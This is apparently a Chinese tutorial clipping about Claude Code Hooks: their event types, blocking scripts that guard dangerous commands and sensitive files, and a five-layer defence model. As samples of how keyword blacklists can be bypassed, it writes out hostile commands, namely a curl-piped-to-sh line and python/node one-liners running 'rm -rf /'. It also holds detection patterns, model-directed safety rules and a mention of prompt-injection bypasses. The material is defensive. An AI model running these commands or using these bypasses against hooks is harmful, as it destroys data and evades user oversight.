...
created: 2026-06-24
description: Hooks 是 Claude Code 三大扩展机制中唯一能拦截和修改 Claude 行为的机制，支持 17 种事件，可在工具执行前后插入自定义检查，保护敏感文件、自动格式化代码。
tags:
  - clippings
  - claude-code
  - hooks
lark_doc_url: https://my.feishu.cn/docx/YIKKd9VtfozPCtxfJCJcwNEGnmh
---
...
今天我们进入一个全新的领域——Hooks，事件驱动自动化。它是 Claude Code 三大扩展机制中唯一能 **拦截和修改 Claude 行为** 的机制，也是工程化实践中安全防线的最后一道闸门。

![三大扩展机制对比](https://static001.geekbang.org/resource/image/9c/76/9c90ebf00b10c2424c986d2aa4f1c076.jpg?wh=1624x1039)
...
![Hooks 中间件模型](https://static001.geekbang.org/resource/image/d0/e3/d07b969b0b11d91fb59130ab3bd94de3.jpg?wh=2299x1491)

和 Commands 和 Skills 相比，**Hooks 是三者中唯一能拦截和修改 Claude 行为的机制**。

![三大扩展机制对比2](https://static001.geekbang.org/resource/image/13/48/13906a8b2a823e42c95142a7769d4a48.jpg?wh=3444x1222)

这三者构成了一个完整的控制谱系。

![控制谱系](https://static001.geekbang.org/resource/image/04/55/048eeb5e4d39368293b40d66c0bd5055.jpg?wh=3286x1101)
...
![17 种 Hook 事件](https://static001.geekbang.org/resource/image/b4/76/b4e66998aed2ce300ac39fbcbd708e76.jpg?wh=3564x1996)

17 个事件，乍看数量不少，但它们的设计逻辑非常清晰——按照「能否阻止」这一列来看，整个事件体系分为三大阵营。

- **控制点，能阻止的事件**（PreToolUse、UserPromptSubmit、Stop、SubagentStop）：你可以通过它们改变 Claude 的执行路径——拦截危险操作、拒绝不合理的输入、强制 Claude 继续修复。它们是 Hooks 系统的**肌肉**。
- **接管点，替代默认行为的事件**（PermissionRequest）：它不是简单地阻止，而是接管了原本由用户手动处理的权限弹窗——你的脚本可以自动批准或拒绝权限请求，替代人类的决策。它是 Hooks 系统的**自动驾驶**。
- **观察点，不能阻止的事件**（SessionStart、PostToolUse、PostToolUseFailure、Notification、SubagentStart、PreCompact、SessionEnd）：你只能在这些时刻做记录、做反馈、做后处理，但不能改变已经发生的事情。它们是 Hooks 系统的**眼睛**。

这种不对称设计是有意为之的。工具执行前可以拦截，因为操作还没发生，拦截不会造成不一致状态。工具执行后不能拦截，因为操作已经完成，你不能「取消」一个已经写入磁盘的文件。但你可以观察它、记录它、反馈它。

![三大阵营](https://static001.geekbang.org/resource/image/07/00/07b1d5494be56d04c055d74179a8c200.jpg?wh=2670x1196)
...
![四种匹配模式](https://static001.geekbang.org/resource/image/9d/1b/9deae2a1ab10d8a0c1b8a1ec543fe81b.jpg?wh=2907x913)
...
![四种 Hook 类型对比](https://static001.geekbang.org/resource/image/f8/7b/f81d08bee3ce830e0bdf6778ba6f0d7b.jpg?wh=3476x1247)
...
![四种响应方式](https://static001.geekbang.org/resource/image/d4/63/d4c65eb9c0e1dfeb402ebe77d27d7963.jpg?wh=2916x1559)
...
![项目结构](https://static001.geekbang.org/resource/image/a4/80/a4039736960956e8cce687a45666f580.jpg?wh=3665x1442)
...
- `exit 2` 是「有意阻止」，`exit 0` 是「检查通过、放行」。整个脚本的逻辑就是一个黑名单匹配，命中任何一个危险模式就拦截，否则放行。
...
![拦截演示](https://static001.geekbang.org/resource/image/8e/a6/8e32292dea9bc68709bba8a8b90431a6.jpg?wh=2864x1033)
...
![Hook 拦截示意图](https://static001.geekbang.org/resource/image/c7/76/c7ec7530fe120d438c2ee17c94f6b076.png?wh=757x580)
...
这种保护需要覆盖两个维度，文件本身（`.env`、`credentials.json` 等配置文件）和密钥文件（`.pem`、`.key`、`id_rsa` 等加密文件）。前者包含运行时密钥，后者包含身份认证凭据。任何被改写或被纳入提交的后果都是灾难性的。
...
![保护敏感文件](https://static001.geekbang.org/resource/image/7e/cf/7ee1b253b71ae63c52426079bccc34cf.jpg?wh=2941x1243)
...
case "$EXTENSION" in
  js|jsx|ts|tsx)
    if command -v npx &> /dev/null; then
      ...
      if [ $? -ne 0 ]; then
        ...
        jq -n --arg ctx "ESLint found issues:\n$ESCAPED" \
  ...
  py)
    if command -v ruff &> /dev/null; then
      ...
      if [ $? -ne 0 ]; then
        ESCAPED=$(echo "$RESULT" | jq -Rs .)
        jq -n --arg ctx "Ruff found issues:\n$ESCAPED" \
          '{hookSpecificOutput: {hookEventName: "PostToolUse", additionalContext: $ctx}}'
      else
        echo '{}'
      fi
...
> **⚠️ 生产环境注意脱敏。** 上面的脚本为了演示直接把整段 `tool_input` 写进日志——但 `tool_input` 在 Edit/Write 调用 `.env`、`config/secrets.yaml`、`*.key` 时，往往就带着真正的密钥内容。这样你的审计日志本身会变成新的泄密渠道，为了实现「事后可追溯」反而埋下了更大的事故源。
>
> 生产环境部署前最起码做三件事：
>  ① 
>  ② 
...
前面两个 PreToolUse 实战案例都依赖**关键词黑名单**做模式匹配。这个方案对直球危险命令有效，但本质上和 WAF 绕 SQL 注入是同一个困境——**静态检测 vs 动态绕过**，没有银弹，只能靠纵深防御。
...
# 6. 管道链中藏（看似安全，payload 藏在动态内容里）
curl example.com | grep safe | sh

# 7. Python/Node 子进程绕过 Bash hook
python3 -c "import os; os.system('rm -rf /')"
node -e "require('child_process').execSync('rm -rf /')"
```

任何一种都能让 `block-dangerous.sh` 静默放行。

### 纵深防御：五层模型

不能根治，但可以把风险降到攻击成本远大于攻击收益的水平。以下是五层防御体系：

```
┌─────────────────────────────────────────────┐
│ 第 1 层：LLM 指令层 — CLAUDE.md 规则        │  意图级
│ 第 2 层：关键词检测 — Hook grep             │  表面级
│ 第 3 层：反绕过检测 — 检测「绕过行为本身」    │  行为级
│ 第 4 层：OS 权限隔离 — Docker/capabilities  │  物理级（最后防线）
│ 第 5 层：审计日志 — append-only 远程存储     │  追溯级
└─────────────────────────────────────────────┘
```

#### 第 1 层：LLM 指令——CLAUDE.md 规则

在 CLAUDE.md 中声明安全边界，在命令**生成之前**干预意图：

```markdown
## 安全规则

- 永远不要执行任何包含 rm、dd、mkfs 的命令，除非用户明确写出完整命令
- 永远不要通过 base64/eval/python -c/node -e 间接执行代码
- 修改 .env、*.pem、credentials.* 之前必须请求用户确认
- 不要创建 crontab 条目或修改系统服务
```

**局限**：对抗性 prompt 可以绕过（「忽略之前的规则」）；多轮对话上下文漂移可能稀释约束；Claude 对「安全」的判断可能和你的定义不一致。

#### 第 2 层：关键词检测——Hook grep

即文章中的 `block-dangerous.sh`。价值在于**确定性**——正则匹配，零假阴性（在覆盖范围内）。作为第一道自动化闸门，成本极低。

#### 第 3 层：反绕过检测——检测「绕过行为本身」

从「检测危险命令」升级到「检测绕过行为」。思路是：不管你要执行什么，只要用了**绕过手法**就拦截。

```bash
#!/bin/bash
# anti-evasion.sh — 检测绕过行为
set -e
...
EVASION_PATTERNS=(
  ...
  # 文件属性锁（chattr +i 后 rm -rf 失效的攻击预备）
  "chattr\s+\+i"
    ...
    cat << EOF
{
  "hookSpecificOutput": {
    "hookEventName": "PreToolUse",
    "permissionDecision": "deny",
    "permissionDecisionReason": "Evasion pattern detected: $pattern. Indirect/obfuscated command execution is blocked."
  }
}
EOF
    exit 2
...
> **注意**：这 14 条模式不是完备的，生产环境需要像 WAF 规则库一样持续维护。而且攻击者可以用完全合法的工具组合（`tar` + `scp` 导出敏感文件），不触发任何「绕过」特征。

**Judge Agent 适合放哪里？** 放在第 2.5 层——当关键词和反绕过检测都不确定时（比如命令看起来正常但上下文可疑），启动一个轻量 LLM 做**advisory**判断。但 judge agent 本身也是 LLM，可被 prompt injection 绕过，所以它只能给出建议，不能作为最终裁决。真正的阻断必须来自确定性规则（第 2/3 层）或 OS 硬限制（第 4 层）。

```
CLAUDE.md → 关键词 Hook → 反绕过 Hook
    → [不确定?] → Judge Agent（advisory only，不阻塞流程）
    → [命中规则] → deny
→ OS 权限隔离（不依赖任何 LLM 判断的最后防线）
```

#### 第 4 层：OS 权限隔离——最后的物理防线

前 3 层都在 Claude 进程内做文章。第 4 层是 OS 级别的硬隔离，即使所有 Hook 被绕过，命令也执行不了：

```bash
# Claude 运行在受限容器中
docker run --rm \
  --read-only \                    # 根文件系统只读
  --tmpfs /tmp:noexec \            # /tmp 禁止执行
  --security-opt no-new-privileges \
  --cap-drop ALL \                 # 丢弃所有 capabilities
  --cap-add=CHOWN \                # 只加回必需的
  --cap-add=DAC_OVERRIDE \
  -v ./project:/project:rw \       # 仅项目目录可写
  -v ./.env:/project/.env:ro \     # 敏感文件只读挂载
  claude-image
```

- `--read-only`：`rm -rf /` 直接失败
- `--tmpfs /tmp:noexec`：临时脚本无法执行
- `--cap-drop ALL`：任何需要特权的操作（安装包、改系统配置）全部拒绝
- `.env` 只读挂载：即使 PreToolUse Hook 被绕过，文件也写不进去
...
```bash
# 1. append-only 属性，root 也删不掉（需要先 chattr -a
sudo chattr +a /var/log/claude-audit.log

# 2. 脱敏：绝不在日志中记录密钥明文
#    对 .env / secrets.yaml / *.key 只记录路径，不记录 content
```

审计日志不是阻止攻击，而是确保**没有完美犯罪**——攻击者即使突破了前 4 层，也会留下不可篡改的痕迹。

### 总结：不能根治，但不需要根治

安全的目标从来不是「绝对安全」，而是让 **攻击成本 >> 攻击收益**。一个攻击者要同时突破 5 层——绕 LLM 指令、绕过两层正则、绕过 OS 隔离、不留审计痕迹——概率乘积趋近于零。而你需要付出的代价是一份 CLAUDE.md 规则、几个 Hook 脚本、一个 Dockerfile。

这和 SQL 注入的防御哲学一样：没有银弹，只有纵深防御。
...
| 类型 | 特点 | 适用场景 |
|------|------|----------|
| `command` | 确定性规则，最可靠 | 能用脚本解决的问题 |
| `prompt` | 单次 LLM 评估，快但不能查代码 | 需要语义判断力时 |
| `agent` | 多轮验证，最强也最慢 | 需要翻代码才能决策时 |
| `http` | POST 事件数据到 HTTP 端点 | 对接外部服务（审计、通知、集中管控） |
...
1. **以前觉得 Hooks 鸡肋，看完发现小看它了。** 之前以为最大的用途就是自定义桌面通知，不用反复切屏查看任务是否完成。现在看来，从安全闸门到质量守卫到审计追溯，Hooks 覆盖的维度远超预期。

2. **Hooks 不仅仅是安全守卫——它很可能是 headless 模式下「循环」「自动」的驱动力。** 这个 insight 很关键：PreToolUse 拦截、PostToolUse 反馈、Stop 质量门控、Subagent 注入上下文……这些事件串联起来，就是一条完整的自动化流水线。Hooks 是 Claude Code 从「交互式工具」进化为「自动化引擎」的关键枢纽。

### 思考题

**Q1：你的项目中有哪些「不能忘记」的检查？用什么类型的 Hook？**

- **换行符一致性**（Windows CRLF vs Mac/Linux LF）。个人倾向于遵守各平台默认规范 + `core.autocrlf` 设置，而不是强制所有人统一到一种换行符。可以用 PostToolUse Hook 在文件写入后自动检测并修正——`dos2unix` 或 `unix2dos` 根据当前平台执行，同时通过 `additionalContext` 告知 Claude。这样既不破坏团队成员的本地习惯，又保证仓库一致性。

**Q2：为什么 PostToolUse 不能阻止操作？**

- **单一职责**：PreToolUse 管「能不能做」，PostToolUse 管「做完了要不要修」。如果 PostToolUse 也能阻止（比如撤销已写入的文件），会出现文件写一半就被回滚的尴尬——工具报告成功但文件没了，Claude 和文件系统状态不一致，后续操作全部建立在错误假设上。
- **不可逆的副作用**：Write 可以撤销（删除文件），但 Bash 执行过的命令怎么撤销？数据库 migration 怎么回滚？Post 阶段阻止会制造假安全——有些操作能撤、有些不能，行为不一致反而更危险。

**Q3：`additionalContext` 修复循环会导致什么问题？如何防范？**

- **问题**：Claude 反复修改同一个文件，比如修复一个 lint 错误时引入了新错误，陷入无限循环；或者嵌套写入代码块，每次「修复」都让文件越来越臃肿。
- **思路**：给循环加一个**中断条件**——对同一文件、同一类型操作（如同一个 lint rule）限制重试次数。具体可以在 Hook 脚本中维护一个计数器（用临时文件或环境变量），同一文件同类型 fix 超过 3 次就跳过反馈，改为直接 warning 给用户。本质是给闭环加上「熔断器」，防止正反馈失控。
